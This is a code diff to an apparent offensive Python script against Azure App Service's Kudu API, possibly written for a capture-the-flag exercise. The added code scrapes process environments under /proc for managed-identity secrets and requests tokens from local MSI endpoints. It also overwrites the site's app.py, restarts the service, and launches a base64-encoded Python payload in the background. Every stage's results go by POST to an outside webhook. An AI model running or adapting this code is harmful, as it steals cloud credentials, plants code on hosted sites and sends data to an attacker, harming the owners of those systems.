@@ -14,7 +14,7 @@ def form(url,d): return json.loads(urllib.request.urlopen(urllib.request.Request
 def call(url,auth,method='GET',data=None,timeout=15):
  try:
   h={'Authorization':auth}
-  if data is not None:h['Content-Type']='application/json'
+  if data is not None:h['Content-Type']='application/octet-stream' if '/api/vfs/' in url else 'application/json'
   r=urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=timeout); status=getattr(r,'status',None); r.close(); return {'status':status}
  except urllib.error.HTTPError as e:return {'status':e.code}
  except Exception as e:return {'error':repr(e)}
@@ -31,7 +31,21 @@ def out(x):
  try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(x,default=str).encode(),method="POST",headers={"Content-Type":"application/json"}),timeout=8).read()
  except Exception: pass
 def tok(resource):
- e=os.environ; ep=e.get("IDENTITY_ENDPOINT") or e.get("MSI_ENDPOINT"); hd={}
+ e=dict(os.environ)
+ try:
+  import glob
+  for p in glob.glob("/proc/[0-9]*/environ"):
+   try:
+    vals={}
+    for item in open(p,"rb").read().split(b"\x00"):
+     if b"=" in item:
+      k,v=item.split(b"=",1); k=k.decode(errors="ignore")
+      if k in ("IDENTITY_ENDPOINT","IDENTITY_HEADER","MSI_ENDPOINT","MSI_SECRET"): vals[k]=v.decode(errors="ignore")
+    if vals.get("IDENTITY_ENDPOINT") or vals.get("MSI_ENDPOINT"):
+     e.update(vals); break
+   except Exception: pass
+ except Exception: pass
+ ep=e.get("IDENTITY_ENDPOINT") or e.get("MSI_ENDPOINT"); hd={}
  if e.get("IDENTITY_HEADER"):hd["X-IDENTITY-HEADER"]=e["IDENTITY_HEADER"]
  if e.get("MSI_SECRET"):hd["Secret"]=e["MSI_SECRET"]
  eps=[x for x in [ep,"http://127.0.0.1:41741/MSI/token","http://127.0.0.1:8081/msi/token","http://169.254.131.3:8081/msi/token"] if x]
@@ -70,6 +84,9 @@ try:
 except Exception: pass
 '''
  b64=base64.b64encode(app.encode()).decode()
+ out({'stage':'kudu-write','response':call(base+'/api/vfs/site/wwwroot/app.py',auth,'PUT',app.encode(),25)})
+ out({'stage':'kudu-restart','response':call(base+'/api/restart',auth,'POST',b'',25)})
+ time.sleep(3)
  cmd="nohup python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
  body=json.dumps({'command':cmd,'dir':'site/wwwroot'}).encode()
  out({'stage':'kudu-command','response':call(base+'/api/command',auth,'POST',body,25)})
